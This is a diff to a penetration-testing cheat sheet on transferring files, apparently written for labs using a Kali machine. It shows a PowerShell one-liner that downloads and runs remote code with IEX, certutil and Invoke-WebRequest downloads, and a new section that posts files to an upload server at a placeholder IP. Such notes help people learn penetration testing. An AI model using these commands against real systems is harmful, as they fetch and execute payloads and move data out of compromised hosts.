@@ -76,19 +76,19 @@ Invoke-WebRequest -Uri 'http://<http server IP>:8000/<filename>' -OutFile <filen
 
 PowerShell from cmd
 
-```cmd
+```powershell
 powershell.exe -command Invoke-WebRequest -Uri http://<http server IP>:8000/<filename> -OutFile <filename>
 ```
 
 Download and execute with `Invoke-Expression` without saving file
 
-```cmd
+```powershell
 powershell.exe IEX(New-Object Net.WebClient).downloadstring(http://<http server IP>:8000/<filename>)
 ```
 
 Certutil
 
-```cmd
+```powershell
 certutil -urlcache -split -f 'http://<http server IP>:8000/<filename>' <path_destiny><filename>
 ```
 
@@ -118,6 +118,18 @@ Perl oneliner
 
 ```bash
 perl -MHTTP::Tiny -e '$http = HTTP::Tiny->new; $http->mirror("http://<http server IP>:8181/file.txt", "file.txt");'
+```
+
+### upload from Linux
+
+Start HTTP upload server on Kali
+
+```bash
+python3 -m uploadserver 9090
+```
+
+```bash
+curl -X POST http://<HTTP Server IP>:9090/upload -F 'files=@<filename1>' -F 'files=@<filename2>'
 ```
 
 ## RDP - tsclient
